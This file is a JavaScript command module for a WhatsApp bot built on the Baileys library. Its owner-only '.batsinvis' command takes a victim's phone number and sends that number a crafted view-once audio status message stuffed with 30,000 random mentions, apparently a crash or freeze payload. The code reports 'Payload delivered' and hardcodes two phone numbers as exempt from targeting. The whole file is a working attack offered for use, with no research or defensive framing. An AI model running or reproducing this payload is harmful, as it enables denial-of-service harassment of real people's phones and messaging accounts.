// commands/batsinvis.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// Protected numbers (cannot be targeted)
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function batsinvisCommand(sock, chatId, message, args) {
    // Owner-only check
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🦇 *Bats Invis*\n\nUsage: .batsinvis <number>\nExample: .batsinvis 628123456789"
        }, { quoted: message });
        return;
    }

    // Clean and validate target number
    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    // Check if target is protected
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { 
            text: "🛡️ *Protected Number*\nThis number cannot be targeted."
        }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🦇 Sending batsignal to ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🦇", key: message.key } });

    try {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    audioMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "audio/mpeg",
                        fileSha256: Buffer.from([226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0, 44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245, 153, 93, 211]),
                        fileLength: 432722,
                        seconds: 26,
                        ptt: false,
                        mediaKey: Buffer.from([182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98, 117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212, 145]),
                        fileEncSha256: Buffer.from([29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84, 131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211, 83, 153]),
                        directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: 1746275400,
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        await sock.sendMessage(chatId, { text: `✅ Payload delivered to ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "✅", key: message.key } });

    } catch (error) {
        console.error('[BatsInvis]', error);
        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "❌", key: message.key } });
    }
}

module.exports = batsinvisCommand;